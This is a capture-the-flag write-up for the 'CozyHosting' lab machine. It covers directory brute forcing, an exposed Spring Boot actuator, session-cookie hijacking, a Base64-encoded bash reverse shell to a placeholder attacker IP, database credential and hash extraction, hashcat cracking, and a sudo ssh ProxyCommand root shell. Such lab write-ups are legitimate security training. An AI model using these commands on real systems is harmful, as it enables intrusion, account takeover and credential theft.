
# CozyHosting - Writeup

## Overview

Target: CozyHosting  
Difficulty: Easy  
Attack Path: Directory Enumeration → Actuator Exposure → Session Hijacking → Admin Panel Access → Reverse Shell → .jar Credential Extraction → PostgreSQL Access → Hash Cracking → Sudo Privilege Escalation  

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <TARGET-IP>
```

Web service was running on port 80.

---

## 2. Directory Enumeration

Initial brute force:

```bash
ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

No significant results.

Using a larger wordlist:

```bash
ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Discovered:

/actuator

Further enumeration revealed:

/actuator/sessions

---

## 3. Session Hijacking

Inside `/actuator/sessions`, active session data was exposed.

A session belonging to user `kanderson` was identified.

By inspecting the page source (F12), session handling logic was understood.

The session ID was manually inserted into the browser cookie:

session=<KANDERSON_SESSION_ID>

After refreshing the page, admin panel access was obtained.

---

## 4. Reverse Shell via Admin Panel

The admin panel contained functionality allowing command execution.

To bypass filters, a Base64 encoded reverse shell was used.

Generate payload:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1" | base64
```

Execute on target:

```bash
echo <BASE64_PAYLOAD> | base64 -d | bash
```

Start listener:

```bash
nc -lvnp 4444
```

Reverse shell obtained.

---

## 5. Post Exploitation

Basic enumeration:

```bash
whoami
id
sudo -l
```

A `.jar` file was discovered during internal enumeration.

It was extracted:

```bash
jar xf app.jar
```

---

## 6. Extracting PostgreSQL Credentials

Inside the extracted files, database configuration was found:

spring.datasource.username=postgres  
spring.datasource.password=<PASSWORD>

---

## 7. PostgreSQL Access

Connected locally:

```bash
psql -h localhost -U postgres
```

Database tables contained user hashes.

An admin hash was extracted.

---

## 8. Hash Cracking

The hash format:

$2a$...

Identified as bcrypt.

Cracked using hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password for user:

josh

Switched user:

```bash
su josh
```

---

## 9. Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Output:

(ALL) NOPASSWD: /usr/bin/ssh

Using GTFOBins technique:

```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

Root shell obtained.

---

## 10. Root Access

```bash
whoami
```

Output:

root

Root flag captured.

---

## Attack Summary

1. Directory brute force
2. Actuator exposure
3. Session hijacking
4. Admin access
5. Base64 reverse shell
6. .jar credential extraction
7. PostgreSQL access
8. Hash cracking
9. Sudo misconfiguration (ssh)
10. Root

---

## Key Takeaways

- Always enumerate hidden directories
- Spring Boot actuator endpoints can expose sensitive data
- Inspect session storage endpoints
- Analyze .jar files for hardcoded credentials
- Always run `sudo -l`
- GTFOBins is critical for privilege escalation
